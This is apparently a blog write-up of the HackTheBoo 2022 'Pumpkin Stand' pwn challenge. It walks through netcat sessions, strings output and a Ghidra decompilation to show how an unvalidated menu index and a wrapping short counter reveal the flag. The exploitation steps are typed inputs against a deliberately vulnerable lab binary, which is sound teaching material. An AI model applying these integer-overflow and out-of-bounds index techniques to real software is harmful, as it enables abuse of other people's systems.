+++
title = "CTF Writeup - Pumpkin Stand"
date = 2019-11-27
slug = "pumpkin"
authors = ["Inryatt"]
+++

Type: Pwn

Difficulty: Easy

CTF: HackTheBoo 2022

For this challenge, we’re only given a C executable file, `pumpkin_stand`, not the challenge code itself, as well as a mock flag.txt. To successfully obtain the real flag, we must interact with the docker instance that is running this binary. 

### Problem analysis

To start off, this is what is obtained when interacting with the docker via netcat:

```c
┌──(kali㉿lahabrea)-[~/Downloads]
└─$ nc 161.35.164.157 31424

                                          ##&                                
                                        (#&&                                 
                                       ##&&                                  
                                 ,*.  #%%&  .*,                              
                      .&@@@@#@@@&@@@@@@@@@@@@&@@&@#@@@@@@(                   
                    /@@@@&@&@@@@@@@@@&&&&&&&@@@@@@@@@@@&@@@@,                
                   @@@@@@@@@@@@@&@&&&&&&&&&&&&&@&@@@@@@&@@@@@@               
                 #&@@@@@@@@@@@@@@&&&&&&&&&&&&&&&#@@@@@@@@@@@@@@,             
                .@@@@@#@@@@@@@@#&&&&&&&&&&&&&&&&&#@@@@@@@@@@@@@&             
                &@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@            
                @@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&@@@@@@@@@&@@@@@            
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@            
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@            
                .@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@             
                 (@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@.             
                   @@@@@@@@@@@@@@&&&&&&&&&&&&&&&@@@@@@@@@@@@@@               
                    ,@@@@@@@@@@@@@&&&&&&&&&&&&&@@@@@@@@@@@@@                 
                       @@@@@@@@@@@@@&&&&&&&&&@@@@@@@@@@@@/                   
                                                                             
Current pumpcoins: [1337]                                                    
                                                                             
Items:                                                                       
                                                                             
1. Shovel  (1337 p.c.)                                                       
2. Laser   (9999 p.c.)                                                       
                                                                             
>>
```

The supposedly ‘correct’ interaction with this program would be this:

```c
>> 1                                                                              
                                                                                  
How many do you want?                                                             
                                                                                  
>> 1                                                                              
                                                                                  
Current pumpcoins: [0]                                                            
                                                                                  
                                                                                  
Good luck crafting this huge pumpkin with a shovel!                               
                                                                                  
                                                                                  
Current pumpcoins: [0]                                                            
                                                                                  
Items:                                                                            
                                                                                  
1. Shovel  (1337 p.c.)                                                            
2. Laser   (9999 p.c.)                                                            
                                                                                  
>> 
```

As we can see, the value for pumpcoins is subtracted from, depending on the price of the item selected.

If we attempted to buy the second item, which we shouldn’t be able to do, we get this message:

```c
>> 2                                                                              
                                                                                  
How many do you want?                                                             
                                                                                  
>> 1                                                                              
                                                                                  
[-] Not enough pumpcoins for this!                                                
                                                                                  
                                                                                  
Current pumpcoins: [0]
```

However, we can see something still happens to our current pumpcoin value, which shows this isn’t a very resilient program. In fact, it allows us to spend more coins than what we currently own, as it seems to only verify if we have more coins than the price of a single unit of what we’re attempting to purchase.

```c
Current pumpcoins: [1337]                                                         
                                                                                  
Items:                                                                            
                                                                                  
1. Shovel  (1337 p.c.)                                                            
2. Laser   (9999 p.c.)                                                            
                                                                                  
>> 1                                                                              
                                                                                  
How many do you want?                                                             
                                                                                  
>> 10                                                                             
                                                                                  
Current pumpcoins: [-12033]                                                       
                                                                                  
                                                                                  
[-] Not enough pumpcoins for this!
```

This doesn’t help much in obtaining the flag but we can see that this piece of software is quite faulty.

At this point, it was worth taking a look at the binary file itself, to search for any obvious clues to solve this challenge.

### Strings

A quick look at the output of the ‘string’ tool (Truncated to just the interesting parts - Full file can be viewed at the end of this writeup)

Here we have some function headers:

```jsx
└─$ strings pumpkin_stand 
./glibc/ld-linux-x86-64.so.2
libc.so.6
exit
fopen
__isoc99_scanf
puts
__stack_chk_fail
stdin
printf
fgets
stdout
alarm
```

The presence of `fgets` here are big red flags pointing to being possible to cause an overflow somewhere in the program execution, since it often doesn’t have a boundary check on where to write to.

And here we have the strings that are the text that is printed to the terminal:

```c
Current pumpcoins: [%s%d%s]
Items: 
1. Shovel  (1337 p.c.)
2. Laser   (9999 p.c.)
[1;32m
                                          ##&
                                        (#&&
                                       ##&&
                                 ,*.  #%%%&  .*,
%s                      .&@@@@#@@@&@@@@@@@@@@@@&@@&@#@@@@@@(
                    /@@@@&@&@@@@@@@@@&&&&&&&@@@@@@@@@@@&@@@@,
                   @@@@@@@@@@@@@&@&&&&&&&&&&&&&@&@@@@@@&@@@@@@
                 #&@@@@@@@@@@@@@@&&&&&&&&&&&&&&&#@@@@@@@@@@@@@@,
                .@@@@@#@@@@@@@@#&&&&&&&&&&&&&&&&&#@@@@@@@@@@@@@&
                &@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                @@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&@@@@@@@@@&@@@@@
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                .@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@
                 (@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@.
                   @@@@@@@@@@@@@@&&&&&&&&&&&&&&&@@@@@@@@@@@@@@
                    ,@@@@@@@@@@@@@&&&&&&&&&&&&&@@@@@@@@@@@@@
                       @@@@@@@@@@@@@&&&&&&&&&@@@@@@@@@@@@/
How many do you want?
[1;31m
[-] You cannot buy less than 1!
[-] Not enough pumpcoins for this!
Good luck crafting this huge pumpkin with a shovel!
./flag.txt
Error opening flag.txt, please contact an Administrator!
Congratulations, here is the code to get your laser:
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
```

As we can see, the program itself seems to read flag.txt and give us the flag. Now, how to trigger this?

### The Solution

Due the erratic behaviour of the program previously, more ‘invalid’ inputs were attempted.

```jsx
└─$ nc 157.245.42.104 30201

                                          ##&                                
                                        (#&&                                 
                                       ##&&                                  
                                 ,*.  #%%&  .*,                              
                      .&@@@@#@@@&@@@@@@@@@@@@&@@&@#@@@@@@(                   
                    /@@@@&@&@@@@@@@@@&&&&&&&@@@@@@@@@@@&@@@@,                
                   @@@@@@@@@@@@@&@&&&&&&&&&&&&&@&@@@@@@&@@@@@@               
                 #&@@@@@@@@@@@@@@&&&&&&&&&&&&&&&#@@@@@@@@@@@@@@,             
                .@@@@@#@@@@@@@@#&&&&&&&&&&&&&&&&&#@@@@@@@@@@@@@&             
                &@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@            
                @@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&@@@@@@@@@&@@@@@            
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@            
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@            
                .@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@             
                 (@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@.             
                   @@@@@@@@@@@@@@&&&&&&&&&&&&&&&@@@@@@@@@@@@@@               
                    ,@@@@@@@@@@@@@&&&&&&&&&&&&&@@@@@@@@@@@@@                 
                       @@@@@@@@@@@@@&&&&&&&&&@@@@@@@@@@@@/                   
                                                                             
Current pumpcoins: [1337]                                                    
Items:                                                                       
1. Shovel  (1337 p.c.)                                   
2. Laser   (9999 p.c.)   
>> 3                           
How many do you want?        
>> 1                      
[-] Not enough pumpcoins for this!   
```

As we can see, the ‘menu’ doesn’t validate whether the user’s input is valid, allowing us to input an ‘option’ larger than the maximum the program is supposed to handle.
Trying other inputs, we get a very strange behavior on the pumpcoin counter - Despite the error, it is altered and becomes negative!

```c
Current pumpcoins: [1337]                                                                                                                                 
Items:                                                                                                                                                    
1. Shovel  (1337 p.c.)                                                       
2. Laser   (9999 p.c.)                                                                                                                                    
>> 4                                                                                                                                                      
How many do you want?                                                                                                                                     
>> 1                                                                                                                                                      
Current pumpcoins: [-4647]                                                                                                                                                                                                             
[-] Not enough pumpcoins for this!                                                                                                                                                                                                     
```

Any further attempt after this yields the flag — The objective of the challenge seems to simply be to get a low enough (or high enough, since these end up being the same due to overflowing) pumpcoin value.

```c
Current pumpcoins: [-4647]                                                                                                                                
Items:                                                                                                                                                    
1. Shovel  (1337 p.c.)                                                       
2. Laser   (9999 p.c.)                                                                                                                                    
>> 5                                 // this could also be 4                                                                                                                              
How many do you want?                                                                                                                                     
>> 1                                                                                                                                                      
Congratulations, here is the code to get your laser:                         
                                                                             
HTB{1nt3g3R_0v3rfl0w_101_0r_0v3R_9000!}
```

Flag: HTB{1nt3g3R_0v3rfl0w_101_0r_0v3R_9000!}

### What happened?

To understand what happened, a disassembler was needed to look at what’s going on under the hood. ([Ghidra](https://github.com/NationalSecurityAgency/ghidra) is the tool used in the next examples/Screenshots.)

Here is the code Ghidra reconstructed for the function ‘main’:

```c
void main(void)
{
  long in_FS_OFFSET;
  short local_54;
  short local_52;
  FILE *local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  local_54 = 0;
  local_52 = 0;
  while( true ) {
    while( true ) {
      while( true ) {
        while( true ) {
          menu();
          __isoc99_scanf(&DAT_0010132b,&local_54);
          printf("\nHow many do you want?\n\n>> ");
          __isoc99_scanf(&DAT_0010132b,&local_52);
          if (0 < local_52) break;
          printf("%s\n[-] You cannot buy less than 1!\n",&DAT_0010134a);
        }
        **pumpcoins** = **pumpcoins** -
                    local_52 * (short)*(undefined4 *)((long)&values + (long)(int)local_54 * 4);
        if (-1 < **pumpcoins**) break;
        printf("\nCurrent pumpcoins: [%s%d%s]\n\n",&DAT_00100e80,(ulong)(uint)(int)**pumpcoins**);
        printf("%s\n[-] Not enough pumpcoins for this!\n\n%s",&DAT_0010134a,&DAT_00100e78);
      }
      if (local_54 != 1) break;
      printf("\nCurrent pumpcoins: [%s%d%s]\n\n",&DAT_00100e80,(ulong)(uint)(int)**pumpcoins**);
      puts("\nGood luck crafting this huge pumpkin with a shovel!\n");
    }
    if (0x270e < **pumpcoins**) break;
    printf("%s\n[-] Not enough pumpcoins for this!\n\n%s",&DAT_0010134a,&DAT_00100e78);
  }
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_50 = fopen("./flag.txt","rb");
  if (local_50 != (FILE *)0x0) {
    fgets((char *)&local_48,0x30,local_50);
    printf("%s\nCongratulations, here is the code to get your laser:\n\n%s\n\n",&DAT_00100ee3,
           &local_48);
                    /* WARNING: Subroutine does not return */
    exit(0x16);
  }
  puts("Error opening flag.txt, please contact an Administrator!\n");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

A closer look at the code above, on the segments that interest us:

```c
          __isoc99_scanf(&DAT_0010132b,&local_54);  // -> Stores the selected item in local_54
          printf("\nHow many do you want?\n\n>> ");
          __isoc99_scanf(&DAT_0010132b,&local_52); // -> Stores amount of item in local_52
          if (0 < local_52) break; // Verify the amount to buy > 1
          printf("%s\n[-] You cannot buy less than 1!\n",&DAT_0010134a);
        }
        **pumpcoins** = **pumpcoins** -
                    local_52 * (short)*(undefined4 *)((long)&values + (long)(int)local_54 * 4); 
```

This is the code where the overflow can be caused, since the way pumpcoins is calculated is, at it’s core `pumpcoins = <current pumpcoin value> - <amount to subtract>` . Thus, if the amount to subtract is a negative number, which is can be since an overflow can occur here, it ends up adding pumpcoins instead of subtracting from them.

```c
.. if (-1 < **pumpcoins**) break;
        printf("\nCurrent pumpcoins: [%s%d%s]\n\n",&DAT_00100e80,(ulong)(uint)(int)**pumpcoins**);
        printf("%s\n[-] Not enough pumpcoins for this!\n\n%s",&DAT_0010134a,&DAT_00100e78);
      }
```

This bit of code would stop a ‘purchase’ if there werent enough pumpcoins but it doesn’t revert the ‘transaction’, which leaves the pumpcoin value changed.

```c
if (0x270e < **pumpcoins**) break;
    printf("%s\n[-] Not enough pumpcoins for this!\n\n%s",&DAT_0010134a,&DAT_00100e78);
  }
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_50 = fopen("./flag.txt","rb");
  if (local_50 != (FILE *)0x0) {
    fgets((char *)&local_48,0x30,local_50);
    printf("%s\nCongratulations, here is the code to get your laser:\n\n%s\n\n",&DAT_00100ee3,
           &local_48);
                    /* WARNING: Subroutine does not return */
    exit(0x16);
  }
```

And finally, here is where we get our flag. If we manage to overflow the pumpcoin value to over 9998, and not fall into any of the previous “if”s, (Having pumpcoins under -1, selecting the shovel or having under 9998 pumpcoins), the normal execution flow of the program will get us our flag!